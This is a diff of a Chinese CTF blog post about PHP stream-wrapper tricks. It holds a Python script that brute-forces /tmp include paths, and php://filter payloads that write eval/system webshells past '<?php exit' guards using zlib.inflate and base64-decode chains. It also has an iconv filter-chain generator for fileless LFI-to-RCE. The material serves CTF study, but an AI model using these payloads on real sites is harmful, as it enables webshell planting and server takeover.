@@ -34,9 +34,11 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/4.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/5.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/7.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230106224829978.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230106231040229.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/6.png">
 <meta property="article:published_time" content="2020-04-27T13:16:35.000Z">
-<meta property="article:modified_time" content="2021-11-02T03:07:06.834Z">
+<meta property="article:modified_time" content="2023-01-06T15:10:41.183Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="PHP伪协议">
@@ -297,7 +299,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.6k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -495,15 +497,28 @@ height:50vh;
 <p>爆破temp文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.43.155&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = <span class="string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            <span class="keyword">print</span> url</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span class="keyword">print</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<h3 id="护网杯easyphp"><a href="#护网杯easyphp" class="headerlink" title="护网杯easyphp"></a>护网杯easyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content = $\_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>),$content);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file\_exists($content))</span><br><span class="line">	<span class="keyword">require</span>\_once($content);</span><br><span class="line">file\_put\_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br></pre></td></tr></table></figure>
-<p>简单代码审计一波，可以直接通过file_put_contents函数生成文件，但是有个&lt;?php exit();所以创建木马也没用，所以需要绕过他,可以通过filter过滤器来进行过滤，通过代码查看发现strip_tags没有过滤，也没有过滤zlib.inflate<br>因此构造payload</p>
+<h3 id="护网杯easyphp-zlib-inflate"><a href="#护网杯easyphp-zlib-inflate" class="headerlink" title="护网杯easyphp(zlib.inflate)"></a>护网杯easyphp(zlib.inflate)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>),$content);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_exists($content))</span><br><span class="line">	<span class="keyword">require_once</span>($content);</span><br><span class="line">file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br></pre></td></tr></table></figure>
+<p>简单代码审计一波，可以直接通过file_put_contents函数生成文件，但是有个<code>&lt;?php exit();</code>所以创建木马也没用，所以需要绕过他,可以通过filter过滤器来进行过滤，通过代码查看发现strip_tags没有过滤，也没有过滤zlib.inflate<br>因此构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;?&gt;&quot;</span>.gzdeflate(<span class="string">&#x27;&lt;?php system($_GET[_]);?&gt;&#x27;</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>生成<code>%3F%3E%B3%B1%2F%C8%28P%28%AE%2C.I%CD%D5P%89ww%0D%89%8E%8F%D5%B4%B6%B7%03%00</code><br>会发现其中有没有url编码的字符比如<code>.I</code>没有关系，但是<code>%00</code>要去掉不然会截断，从而写不了文件<br>同时使用<code>string.srip_tags</code>来去除php和html的标签，因为过滤器是从左到右执行的，因此在我们的payload使用zlib解压前不会被去除标签，因此可以构造以下payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip\_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource.php=idlab.php</span></span><br></pre></td></tr></table></figure>
 <p>传入<code>_</code>参数即可执行命令<br><img src="/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/7.png"></p>
-<h3 id="base64-decode写入"><a href="#base64-decode写入" class="headerlink" title="base64-decode写入"></a>base64-decode写入</h3><p>使用convert.base64-encode筛选器写入也可以,但是要注意编码的时候是8个字符一组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shsell.php</span><br></pre></td></tr></table></figure>
+<h3 id="base64-decode写入-死亡exit"><a href="#base64-decode写入-死亡exit" class="headerlink" title="base64-decode写入(死亡exit)"></a>base64-decode写入(死亡exit)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">	$content .= $_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">	file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>
 
+<p>当可以控制<code>file_put_contents</code>但是存在phpexit时，可以使用base64-decode过滤流再写入，原理是base64解码时只识别<code>A-Za-z0-9\/\=\+</code>范围内的字符串，其他解码后为乱码，因此只需要在<code>phpexit</code>这7个字符的基础上再添加一个字符，后续接上webshell的base64形式即可。</p>
+<ul>
+<li>要注意base64编码的时候是8个字符一组</li>
+</ul>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php&amp;data&#x3D;aPD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+</span><br><span class="line">&#x2F;&#x2F;PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+为&lt;?php eval($_GET[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功写入payload</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230106224829978.png" alt="image-20230106224829978"></p>
+<h3 id="终极LFI-利用iconv和base64-decode无文件lfi"><a href="#终极LFI-利用iconv和base64-decode无文件lfi" class="headerlink" title="终极LFI(利用iconv和base64-decode无文件lfi)"></a>终极LFI(利用iconv和base64-decode无文件lfi)</h3><p>参考地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/122326155">https://blog.csdn.net/rfrder/article/details/122326155</a></p>
+<p>脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span>;</span><br><span class="line">$conversions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">$filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (str_split(strrev($base64_payload)) <span class="keyword">as</span> $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    $filters .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span></span><br><span class="line">$final_payload = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=/etc/passwd&amp;0=id&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>($final_payload);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230106231040229.png" alt="image-20230106231040229"></p>
 <h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input/"></a>php://input/</h2><p>使用POST上传PHP代码并执行<br>下面由于服务器过滤了导致无法执行</p>
 <p><img src="/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/6.png"></p>
 <h2 id="php其他用法"><a href="#php其他用法" class="headerlink" title="php其他用法"></a>php其他用法</h2><table>
@@ -559,7 +574,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/">https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/">April 27th 2020, 9:16:35 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/">November 2nd 2021, 11:07:06 am</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/">January 6th 2023, 11:10:41 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -704,7 +719,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%B4%A2"><span class="toc-number">1.</span> <span class="toc-text">初步探索</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEwriteup"><span class="toc-number">2.</span> <span class="toc-text">查找writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">PHP伪协议知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-filter"><span class="toc-number">3.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-segment-fault%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.1.</span> <span class="toc-text">php7 segment fault特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AFeasyphp"><span class="toc-number">3.1.2.</span> <span class="toc-text">护网杯easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64-decode%E5%86%99%E5%85%A5"><span class="toc-number">3.1.3.</span> <span class="toc-text">base64-decode写入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-number">3.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">php其他用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-number">3.4.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-%E5%92%8Czip"><span class="toc-number">3.5.</span> <span class="toc-text">phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-number">3.6.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-number">3.7.</span> <span class="toc-text">http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-number">3.8.</span> <span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%B4%A2"><span class="toc-number">1.</span> <span class="toc-text">初步探索</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEwriteup"><span class="toc-number">2.</span> <span class="toc-text">查找writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">PHP伪协议知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-filter"><span class="toc-number">3.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-segment-fault%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.1.</span> <span class="toc-text">php7 segment fault特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AFeasyphp-zlib-inflate"><span class="toc-number">3.1.2.</span> <span class="toc-text">护网杯easyphp(zlib.inflate)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64-decode%E5%86%99%E5%85%A5-%E6%AD%BB%E4%BA%A1exit"><span class="toc-number">3.1.3.</span> <span class="toc-text">base64-decode写入(死亡exit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%88%E6%9E%81LFI-%E5%88%A9%E7%94%A8iconv%E5%92%8Cbase64-decode%E6%97%A0%E6%96%87%E4%BB%B6lfi"><span class="toc-number">3.1.4.</span> <span class="toc-text">终极LFI(利用iconv和base64-decode无文件lfi)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-number">3.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">php其他用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-number">3.4.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-%E5%92%8Czip"><span class="toc-number">3.5.</span> <span class="toc-text">phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-number">3.6.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-number">3.7.</span> <span class="toc-text">http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-number">3.8.</span> <span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3360,9 +3375,161 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 155
+        Total : 163
         </div>
         <!-- search  -->
         
@@ -3377,8 +3544,57 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/" >Despercate Cat 带来的Tomcat利用思路</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" >利用链神器-tabby使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2022/10/01/neo4j%E5%9B%BE%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0/" >neo4j图形数据库笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2022/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >PHP反序列化利用面总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2022/09/22/Webshell%E5%85%8D%E6%9D%80%E4%B9%8Bphp/" >Webshell免杀之php(WebShell免杀篇一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2022/09/21/source-map%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/" >source map源码泄露利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
